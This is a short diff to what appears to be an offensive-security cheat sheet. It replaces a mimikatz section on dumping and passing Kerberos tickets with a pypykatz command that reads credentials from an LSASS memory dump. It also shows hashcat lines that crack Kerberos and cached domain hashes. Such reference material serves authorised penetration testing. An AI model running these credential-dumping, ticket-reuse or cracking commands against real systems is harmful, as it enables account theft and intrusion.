@@ -63,8 +63,8 @@ npm install
 npm run build:linux
 ```
 
-### mimikatz
-https://github.com/ParrotSec/mimikatz
+### pypykatz
+https://github.com/skelsec/pypykatz
 
 ### Responder
 https://github.com/lgandx/Responder
@@ -340,17 +340,8 @@ hashcat64.exe -m 19900  -a 0 krb5tetype18.txt <passlist.txt> -o cracked.txt
 hashcat64.exe -m 2100 -a 0 mscache2-hashes.txt <passlist.txt> -o cracked.txt
 ```
 
-## Mimikatz
-### Dump tickets
+## pypykatz
+### Examine lsass dump
 ```bash
-mimikatz.exe
-privilege::debug
-sekurlsa::tickets /export
-```
-
-### Pass the ticket
-```bash
-mimikatz.exe
-kerberos::ptt <ticket>
-klist
+pypykatz lsa minidump lsass.DMP
 ```
